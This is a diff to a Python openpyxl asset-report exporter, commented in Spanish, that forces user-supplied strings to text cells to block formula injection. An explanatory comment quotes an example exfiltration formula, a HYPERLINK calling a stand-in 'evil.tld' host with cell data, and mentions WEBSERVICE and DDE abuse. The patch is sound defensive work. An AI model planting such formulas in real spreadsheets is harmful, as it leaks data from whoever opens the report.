@@ -49,6 +49,36 @@ _ENCABEZADO_FONT = Font(bold=True, color='FFFFFF')
 _CENTRADO = Alignment(horizontal='center', vertical='center')
 
 
+# openpyxl liga como FORMULA cualquier string que empiece con '=' (le pone
+# data_type 'f' y lo escribe dentro de un <f> en el XML). El nombre, la serie,
+# la factura y los nombres de catalogo son texto libre de usuarios autenticados
+# —los serializers solo les ponen max_length—, asi que un activo llamado
+# '=HYPERLINK("https://evil.tld/?d="&A4,"x")' se convierte en formula viva en la
+# maquina de quien abra el reporte (contabilidad, un auditor externo): filtra
+# datos por HYPERLINK/WEBSERVICE, lanza comandos por DDE o corrompe justo las
+# cifras que el documento existe para dar fe. Ningun reporte de este modulo
+# escribe formulas a proposito, asi que forzar el tipo texto no pierde nada.
+_TIPO_TEXTO = 's'
+
+
+def _neutralizar_celda(celda):
+    """Fuerza a texto una celda cuyo valor sea string, para que no quede ligada
+    como formula. Se aplica al valor ya escrito, asi que no lo altera: el
+    usuario ve el texto literal, no un apostrofo agregado."""
+    if isinstance(celda.value, str):
+        celda.data_type = _TIPO_TEXTO
+    return celda
+
+
+def _escribir_fila(ws, valores):
+    """append() + neutralizacion. Toda escritura de fila de datos pasa por aqui
+    para que las dos rutas de exportacion (auditoria y financiero) no puedan
+    divergir: arreglar una y olvidar la otra deja el agujero abierto."""
+    ws.append(valores)
+    for celda in ws[ws.max_row]:
+        _neutralizar_celda(celda)
+
+
 def _nombre_hoja(nombre, usados):
     """Nombre de hoja valido para Excel: sin caracteres prohibidos, <= 31 chars
     y unico dentro del libro (desambigua con un sufijo si ya se uso)."""
@@ -114,7 +144,9 @@ def construir_libro(anio):
 
     for categoria, items in grupos.items():
         ws = wb.create_sheet(title=_nombre_hoja(categoria, usados))
+        # El nombre de la categoria tambien es texto de usuario (catalogo).
         ws['A1'] = categoria
+        _neutralizar_celda(ws['A1'])
         ws['A1'].font = Font(bold=True, size=14)
         ws.append([])  # fila 2 en blanco
         ws.append(COLUMNAS)  # fila 3: encabezados
@@ -123,7 +155,7 @@ def construir_libro(anio):
             celda.fill = _ENCABEZADO_FILL
             celda.alignment = _CENTRADO
         for activo in items:
-            ws.append(_fila(activo, corte))
+            _escribir_fila(ws, _fila(activo, corte))
         _dar_formato(ws)
 
     if not wb.worksheets:
